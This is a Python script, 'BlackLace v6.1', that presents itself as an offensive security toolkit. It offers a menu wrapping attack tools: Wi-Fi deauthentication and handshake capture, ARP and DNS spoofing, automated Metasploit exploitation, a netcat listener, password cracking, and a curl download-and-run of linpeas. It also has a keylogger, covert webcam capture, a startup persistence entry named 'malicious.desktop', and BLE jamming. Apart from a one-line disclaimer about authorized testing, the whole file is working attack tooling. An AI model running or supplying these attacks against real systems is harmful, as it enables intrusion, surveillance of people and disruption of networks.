#!/usr/bin/env python3
# BlackLace v6.1 (Complete)
# Original concept by Null_Lyfe, refactored and extended.
# This version includes a Metasploit search function.
# DISCLAIMER: For educational and authorized security testing only.
# Unauthorized use is illegal. Always have explicit, written permission.

import subprocess
import os
import sys
import shutil
import datetime
from rich.console import Console
from rich.prompt import Prompt

# --- Global Setup ---
console = Console()
LOG_DIR = "blacklace_logs"

# --- Helper Functions ---

def check_root():
    """Exit if the script is not run as root."""
    if os.geteuid() != 0:
        console.print("[bold red]Error: This script requires root privileges for many of its functions.[/bold red]")
        sys.exit(1)

def check_dependencies(tools):
    """Check if all required command-line tools are installed."""
    console.print("[yellow]Checking for required tools...[/yellow]")
    missing_tools = [tool for tool in tools if not shutil.which(tool)]
    if missing_tools:
        console.print(f"[bold red]Error: Missing tools: {', '.join(missing_tools)}[/bold red]")
        sys.exit(1)
    console.print("[green]All dependencies are satisfied.[/green]")

def setup_directories():
    """Create necessary log directories."""
    os.makedirs(os.path.join(LOG_DIR, "wifi"), exist_ok=True)
    os.makedirs(os.path.join(LOG_DIR, "exploits"), exist_ok=True)
    os.makedirs(os.path.join(LOG_DIR, "postex"), exist_ok=True)
    os.makedirs(os.path.join(LOG_DIR, "scans"), exist_ok=True)

def run_command(cmd, message=""):
    """Run a command with unified error handling."""
    if message:
        console.print(message)
    try:
        subprocess.run(cmd, check=False)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operation cancelled by user.[/bold yellow]")
    except FileNotFoundError:
        console.print(f"[bold red]Error: Command '{cmd[0]}' not found.[/bold red]")
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred: {e}[/bold red]")

# --- Reconnaissance & Scanning ---

def run_nmap_scan():
    """Replaces original enumerate_and_pivot with more powerful Nmap scans."""
    target = Prompt.ask("[cyan]Enter target IP, range, or domain[/cyan]")
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(LOG_DIR, "scans", f"nmap_{target.replace('/', '_')}_{timestamp}.txt")
    console.print("\n[yellow]Select Nmap Scan Type:[/yellow]\n[cyan]1.[/cyan] Quick\n[cyan]2.[/cyan] Intense\n[cyan]3.[/cyan] Vuln Scan")
    choice = Prompt.ask("Choose a scan", choices=["1", "2", "3"], default="1")
    cmd_map = {
        "1": ["nmap", "-T4", "-F", target, "-oN", output_file],
        "2": ["nmap", "-T4", "-A", "-v", target, "-oN", output_file],
        "3": ["nmap", "-sV", "--script", "vuln", target, "-oN", output_file],
    }
    run_command(cmd_map[choice], f"[bold yellow]\nRunning Nmap... Output will be saved to {output_file}[/bold yellow]")

def run_gobuster():
    url = Prompt.ask("[cyan]Enter target URL (e.g., http://example.com)[/cyan]")
    wordlist = Prompt.ask("[cyan]Enter path to wordlist[/cyan]", default="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
    if not os.path.exists(wordlist):
        console.print(f"[bold red]Error: Wordlist not found at '{wordlist}'[/bold red]")
        return
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-x", "php,html,txt,bak"]
    run_command(cmd, "[bold yellow]\nStarting Gobuster scan...[/bold yellow]")

def run_sqlmap():
    console.print("[yellow]Ensure you provide a full target URL with a query parameter.[/yellow]")
    url = Prompt.ask("[cyan]Enter the full target URL[/cyan]")
    console.print("\n[yellow]Select a sqlmap action:[/yellow]\n[cyan]1.[/cyan] Enumerate DBs\n[cyan]2.[/cyan] Enumerate Tables\n[cyan]3.[/cyan] Basic Scan (non-interactive)")
    choice = Prompt.ask("Choose an action", choices=["1", "2", "3"], default="1")
    cmd = ["sqlmap", "-u", url]
    if choice == "1": cmd.append("--dbs")
    elif choice == "2":
        db = Prompt.ask("[cyan]Enter the database name[/cyan]")
        cmd.extend(["-D", db, "--tables"])
    elif choice == "3": cmd.append("--batch")
    run_command(cmd, "[bold yellow]\nRunning sqlmap...[/bold yellow]")

def run_wpscan():
    console.print("[yellow]For best results, register for a free API token at wpscan.com.[/yellow]")
    url = Prompt.ask("[cyan]Enter the WordPress target URL[/cyan]")
    api_token = Prompt.ask("[cyan]Enter your WPScan API token (optional)[/cyan]", default="")
    console.print("\n[yellow]Select enumeration options (e.g., '1,2'):[/yellow]\n[cyan]1.[/cyan] Vuln Plugins\n[cyan]2.[/cyan] Vuln Themes\n[cyan]3.[/cyan] Users")
    enum_choices = Prompt.ask("[cyan]Choose options[/cyan]", default="1,2")
    cmd = ["wpscan", "--url", url]
    if api_token: cmd.extend(["--api-token", api_token])
    enum_map = {"1": "vp", "2": "vt", "3": "u"}
    selected_enums = "".join(enum_map.get(c.strip(), "") for c in enum_choices.split(','))
    if selected_enums: cmd.extend(["-e", selected_enums])
    run_command(cmd, "[bold yellow]\nRunning WPScan...[/bold yellow]")

# --- Wi-Fi Attacks ---

def capture_wpa_handshake():
    iface = Prompt.ask("[cyan]Enter Wi-Fi interface in monitor mode[/cyan]")
    channel = Prompt.ask("[cyan]Enter target channel[/cyan]")
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    capture_file = os.path.join(LOG_DIR, "wifi", f"capture_{timestamp}.pcapng")
    cmd = ["hcxdumptool", "-i", iface, "-o", capture_file, "-c", channel, "--enable_status=15"]
    run_command(cmd, f"[bold yellow]\nStarting WPA/PMKID capture... Saved to {capture_file}[/bold yellow]")

def launch_deauth_attack():
    iface = Prompt.ask("[cyan]Enter Wi-Fi interface in monitor mode[/cyan]")
    bssid = Prompt.ask("[cyan]Enter BSSID of target AP[/cyan]")
    station = Prompt.ask("[cyan]Enter MAC of target client (or broadcast)[/cyan]", default="FF:FF:FF:FF:FF:FF")
    count = Prompt.ask("[cyan]Number of packets (0=infinite)[/cyan]", default="0")
    cmd = ["aireplay-ng", "--deauth", count, "-a", bssid, "-c", station, iface]
    run_command(cmd, f"[bold red]\nLaunching Deauth attack...[/bold red]")

# --- Network & Exploitation ---

def launch_mitm_spoof():
    iface = Prompt.ask("[cyan]Enter network interface (e.g. eth0)[/cyan]")
    target1 = Prompt.ask("[cyan]Enter IP of victim 1[/cyan]")
    target2 = Prompt.ask("[cyan]Enter IP of victim 2 (e.g. gateway)[/cyan]")
    cmd = ["ettercap", "-T", "-i", iface, "-M", "arp:remote", f"/{target1}/", f"/{target2}/"]
    run_command(cmd, "[bold red]\nStarting MITM ARP Spoofing via ettercap...[/bold red]")

def launch_dns_spoof():
    iface = Prompt.ask("[cyan]Enter interface to spoof DNS on (e.g. wlan0)[/cyan]")
    console.print("[bold magenta]\nEnsure etter.dns file is configured correctly in /etc/ettercap/etter.dns[/bold magenta]")
    cmd = ["ettercap", "-T", "-q", "-i", iface, "-P", "dns_spoof", "-M", "arp"]
    run_command(cmd, "[bold red]\nDNS spoofing active...[/bold red]")

def searchsploit_exploit():
    query = Prompt.ask("[cyan]Enter exploit search term[/cyan]")
    run_command(["searchsploit", query], f"[bold yellow]\nSearching exploits for: {query}[/bold yellow]\n")

def search_metasploit_modules():
    """Searches for available Metasploit modules."""
    search_term = Prompt.ask("[cyan]Enter a search term (e.g., eternalblue, smb, android)[/cyan]", default="eternalblue")
    cmd = ["msfconsole", "-q", "-x", f"search {search_term}"]
    run_command(cmd, f"[bold yellow]\nSearching for Metasploit modules matching '{search_term}'...[/bold yellow]")

def launch_metasploit_module():
    payload = Prompt.ask("[cyan]Enter Metasploit module[/cyan]")
    rhost = Prompt.ask("[cyan]Target IP (RHOSTS)[/cyan]")
    lhost = Prompt.ask("[cyan]Your local IP (LHOST)[/cyan]")
    lport = Prompt.ask("[cyan]Your local port (LPORT)[/cyan]", default="4444")
    rc_path = os.path.join(LOG_DIR, "exploits", "msf_autorun.rc")
    msf_commands = f"use {payload}\nset RHOSTS {rhost}\nset LHOST {lhost}\nset LPORT {lport}\nexploit\n"
    with open(rc_path, "w") as f:
        f.write(msf_commands)
    console.print(f"[green]Metasploit resource file created at {rc_path}[/green]")
    run_command(["msfconsole", "-r", rc_path], "[bold red]\nLaunching Metasploit...[/bold red]")

def start_listener():
    port = Prompt.ask("[cyan]Enter the local port to listen on[/cyan]", default="4444")
    run_command(["nc", "-lvnp", port], f"[bold yellow]\nStarting Netcat listener on port {port}...[/bold yellow]")

# --- Post-Exploitation & Persistence ---

def crack_hashes():
    """Replaces original broken dump_system_hashes with a functional hash cracker."""
    hash_file = Prompt.ask("[cyan]Enter path to the hash file[/cyan]")
    wordlist = Prompt.ask("[cyan]Enter path to a wordlist (or press Enter for default)[/cyan]", default="")
    if not os.path.exists(hash_file):
        console.print(f"[bold red]Error: Hash file not found.[/bold red]"); return
    cmd = ["john"]
    if wordlist:
        if not os.path.exists(wordlist):
            console.print(f"[bold red]Error: Wordlist not found.[/bold red]"); return
        cmd.extend([f"--wordlist={wordlist}", hash_file])
    else:
        cmd.append(hash_file)
    run_command(cmd, "[bold yellow]\nStarting John the Ripper...[/bold yellow]")
    console.print(f"\n[green]To see cracked passwords, run: [white]john --show {hash_file}[/white][/green]")

def run_privesc_check():
    console.print("[yellow]This module downloads and runs linpeas.sh from its official GitHub repo.[/yellow]")
    if Prompt.ask("Continue?", choices=["y", "n"], default="y") == 'y':
        download_cmd = ["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-o", "linpeas.sh"]
        run_command(download_cmd, "[yellow]Downloading linpeas.sh...[/yellow]")
        if os.path.exists("linpeas.sh"):
            run_command(["chmod", "+x", "linpeas.sh"])
            run_command(["./linpeas.sh"], "[bold yellow]Running LinPEAS...[/bold yellow]")

def start_keylogger():
    log_file = os.path.join(LOG_DIR, "postex", "keys.log")
    console.print(f"[bold red]\nLaunching keylogger (logkeys). Log file: {log_file}[/bold red]")
    run_command(["logkeys", "--start", "--output", log_file])
    console.print("[yellow]To stop the keylogger, run 'sudo logkeys --kill'[/yellow]")

def snap_webcam():
    output_file = Prompt.ask("[cyan]Output file name[/cyan]", default="webcam_snap.jpg")
    path = os.path.join(LOG_DIR, "postex", output_file)
    run_command(["fswebcam", "-r", "640x480", "--no-banner", path], f"[bold red]Snapping webcam... saved to {path}[/bold red]")

def add_startup_persistence():
    script_path = Prompt.ask("[cyan]Enter absolute path to script for persistence[/cyan]")
    if not os.path.isabs(script_path) or not os.path.exists(script_path):
        console.print("[bold red]Error: Please provide a valid, absolute path.[/bold red]"); return
    python_path = shutil.which("python3")
    desktop_entry = f"[Desktop Entry]\nType=Application\nExec={python_path} {script_path}\nHidden=false\nX-GNOME-Autostart-enabled=true\nName=StartupScript\n"
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    target_path = os.path.join(autostart_dir, "malicious.desktop")
    try:
        with open(target_path, "w") as f: f.write(desktop_entry)
        console.print(f"[bold green]\nPersistence added: {target_path}[/bold green]")
    except IOError as e:
        console.print(f"[bold red]Failed to write persistence file: {e}[/bold red]")

# --- Hardware & IoT ---

def ble_jammer():
    iface = Prompt.ask("[cyan]Enter BLE interface[/cyan]", default="hci0")
    cmd = ["bettercap", "-iface", iface, "-eval", "ble.recon on; ble.jam on"]
    run_command(cmd, "[bold red]\nLaunching BLE jammer via Bettercap...[/bold red]")

def zigbee_sniff_with_hackrf():
    console.print("[bold magenta]Note: This requires GNU Radio and gr-802.15.4 installed, and a 'zigbee_sniffer.grc' file.[/bold magenta]")
    run_command(["gnuradio-companion", "zigbee_sniffer.grc"], "[bold red]\nStarting Zigbee sniffing with HackRF...[/bold red]")


# --- Main Menu and Execution ---

def main():
    """Main function to run the script."""
    check_root()
    check_dependencies([
        'nmap', 'gobuster', 'sqlmap', 'wpscan', 'hcxdumptool', 'aireplay-ng',
        'ettercap', 'searchsploit', 'msfconsole', 'john', 'logkeys', 'fswebcam',
        'bettercap', 'gnuradio-companion', 'curl', 'chmod', 'nc'
    ])
    setup_directories()

    menu_options = {
        "1": ("Nmap Scan", run_nmap_scan),
        "2": ("Gobuster Scan", run_gobuster),
        "3": ("SQL Injection Scan", run_sqlmap),
        "4": ("WordPress Scan", run_wpscan),
        "5": ("WPA Handshake Capture", capture_wpa_handshake),
        "6": ("Deauth Attack", launch_deauth_attack),
        "7": ("MITM Attack", launch_mitm_spoof),
        "8": ("DNS Spoof", launch_dns_spoof),
        "9": ("Search Exploit-DB", searchsploit_exploit),
        "10": ("Search Metasploit", search_metasploit_modules),
        "11": ("Run Metasploit Module", launch_metasploit_module),
        "12": ("Netcat Listener", start_listener),
        "13": ("Password Cracker", crack_hashes),
        "14": ("Linux PrivEsc Check", run_privesc_check),
        "15": ("Keylogger", start_keylogger),
        "16": ("Webcam Snap", snap_webcam),
        "17": ("Add Startup Persistence", add_startup_persistence),
        "18": ("BLE Jammer", ble_jammer),
        "19": ("Zigbee Sniffer", zigbee_sniff_with_hackrf),
        "0": ("Exit", sys.exit)
    }

    try:
        while True:
            console.print("\n[bold magenta]BlackLace v6.1 (Complete) - Offensive Security Toolkit[/bold magenta]")
            for key, (desc, _) in menu_options.items():
                console.print(f"[cyan]{key}.[/cyan] {desc}")
            
            choice = Prompt.ask("\nSelect an option", choices=menu_options.keys(), default="0")
            
            desc, func = menu_options[choice]
            if func:
                console.print(f"\n[bold green]----- Running: {desc} -----[/bold green]")
                func()
                console.print(f"[bold green]----- Finished: {desc} -----[/bold green]")
                Prompt.ask("\n[yellow]Press Enter to return to the menu...[/yellow]")
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]Exiting BlackLace. Goodbye![/bold yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()
